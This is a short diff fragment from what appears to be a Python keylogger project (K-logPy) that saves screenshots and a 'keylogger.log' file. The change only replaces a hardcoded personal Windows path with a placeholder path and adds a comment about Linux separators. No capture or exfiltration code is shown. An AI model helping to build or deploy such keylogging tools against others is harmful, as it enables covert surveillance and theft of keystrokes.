@@ -5,7 +5,7 @@ import re, os, pyautogui as pyt
 
 datanow = datetime.now()
 data = datanow.strftime('%d_%m')
-folder_new = r'C:\Users\arthu\Desktop\Projetos\K-logPy\screens_' + data + '\\'
+folder_new = r'your/path/to/save' + data + '\\' # Change the "\\" for / if you use Linux.
 arqlog = folder_new + 'keylogger.log'
 
 try:
